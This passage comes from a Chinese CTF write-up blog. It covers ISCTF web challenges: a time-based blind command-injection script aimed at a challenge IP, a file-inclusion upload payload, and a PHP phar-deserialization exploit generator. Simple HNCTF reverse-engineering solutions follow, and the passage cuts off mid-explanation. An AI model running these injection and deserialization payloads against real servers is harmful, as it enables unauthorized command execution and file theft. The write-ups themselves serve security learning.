所以这个题目可以采用命令盲注，利用sleep来注入（备注：题目提示无回显shell，尝试反弹shell、dnslog都失败，感觉这题无回显不出网，可能这个靶机是不连外网的。）</p><p>采用命令盲注，利用sleep来注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.18.34:20650/rce&quot;</span></span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dics = <span class="string">&quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span></span><br><span class="line"><span class="keyword">for</span> num1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;</span>+<span class="string">&#x27;a:&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(num1)+<span class="string">&#x27;1&#125;&quot; == &#x27;</span>+<span class="string">&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;</span>.<span class="built_in">format</span>(st)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(num1)</span><br><span class="line">            strs = strs+st</span><br><span class="line">            <span class="built_in">print</span>(strs)</span><br><span class="line"><span class="built_in">print</span>(strs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/cbb4/image-20221106155842877.png" alt="image-20221106155842877.png"></p><h2 id="crazy-onlineshell"><a href="#crazy-onlineshell" class="headerlink" title="crazy-onlineshell"></a>crazy-onlineshell</h2><p>在easy-onlineshell基础上加了些过滤，同款脚本也能跑。</p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>目录扫一下找到<a href="http://www.rar/">www.rar</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在文件包含漏洞，结合文件上传，可以上传一个jpg然后利用这个包含，上传文件如下：</p><p>先上传个php文件把Content-Type: application&#x2F;octet-stream</p><p>改成image&#x2F;jpeg，发现还是非法文件，说明文件本身也有验证。那么传入：</p><p><img src="/posts/cbb4/image-20221108092202957.png" alt="image-20221108092202957"></p><p>把后缀命改成jpg后上传，再包含它即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:http://120.79.18.34:20635/?file=uplO4d/exp.jpg</span><br></pre></td></tr></table></figure><img src="image-20221108092327637.png" alt="image-20221108092327637" style="zoom:80%;" /><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，发现有个文件包含漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>存在file_exists方法，这个方法可以触发phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure><p>生成phar文件，注意phpini中phar.readonly设置为Off，改后缀为jpg</p><p>之后文件读取它，?img_name&#x3D;phar:&#x2F;&#x2F;upload&#x2F;phar.jpg</p><p>ISCTF{597a25db-eaa2-473e-9893-a578645f1f818}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wb </tag>
            
            <tag> ISCTF </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 全方向部分WP</title>
      <link href="/posts/9d7b.html"/>
      <url>/posts/9d7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="超级签到"><a href="#超级签到" class="headerlink" title="超级签到"></a>超级签到</h2><p><img src="/posts/9d7b/image-20221012160242556.png" alt="img"></p><p>逻辑就是输入的Str1和Str2进行比较，flag就是Str2，不过这里当Str2[j] &#x3D;&#x3D; 111时被替换成Str2[j] &#x3D;&#x3D; 48。即把o替换成0。</p><p>NSSCTF{hell0_w0rld}</p><h2 id="贝斯是什么乐器啊？"><a href="#贝斯是什么乐器啊？" class="headerlink" title="贝斯是什么乐器啊？"></a>贝斯是什么乐器啊？</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">124</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">    Str[i] -= i;</span><br><span class="line">  base64_encode(Str2, Str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Str做了个小混淆，然后经过base64加密。那么密文就是enc。</p><p><img src="/posts/9d7b/image-20221012161359666.png" alt="img"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;NRQ@PAu;8j[+(R:2806.i&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) + i</span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{B@se64_HAHAHA}</p><h2 id="给阿姨倒一杯Jvav"><a href="#给阿姨倒一杯Jvav" class="headerlink" title="给阿姨倒一杯Jvav"></a>给阿姨倒一杯Jvav</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">32</span>;</span><br><span class="line">            Resultlist.add(result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] KEY = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; ++j) &#123;</span><br><span class="line">            KEYList.add(KEY[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java逆向，拖到ij里面。flag被Encrypt加密了，加密逻辑就是flag的每一位加上64^32。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] - <span class="number">64</span> ^ <span class="number">32</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{This_is_the_flag_!}</p><h2 id="你知道什么是Py嘛？"><a href="#你知道什么是Py嘛？" class="headerlink" title="你知道什么是Py嘛？"></a>你知道什么是Py嘛？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please input your flag:&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(s)!=<span class="number">35</span>  <span class="keyword">or</span> s[<span class="number">0</span>]!=<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(s[i-<span class="number">1</span>])^<span class="built_in">ord</span>(s[i])!=arr[i-<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br></pre></td></tr></table></figure><p>python逆向。这题直接给源码了。要求ord(s[i-1])^ord(s[i])!&#x3D;arr[i-1]，已知s[0] &#x3D; 